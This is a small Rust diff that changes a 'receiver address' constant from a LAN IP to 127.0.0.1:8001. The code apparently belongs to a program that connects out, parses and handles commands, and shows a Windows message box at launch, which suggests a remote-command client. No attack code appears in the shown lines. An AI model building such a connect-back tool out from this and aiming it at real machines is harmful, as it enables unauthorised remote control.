@@ -8,7 +8,7 @@ use cmd::{parse_command, handle};
 /// 
 /// The receiver address. Change this!
 /// 
-const CONNECT_ADDRESS: &str = "192.168.1.111:8001";
+const CONNECT_ADDRESS: &str = "127.0.0.1:8001";
 
 ///
 /// Displays a Windows MessageBox at launch
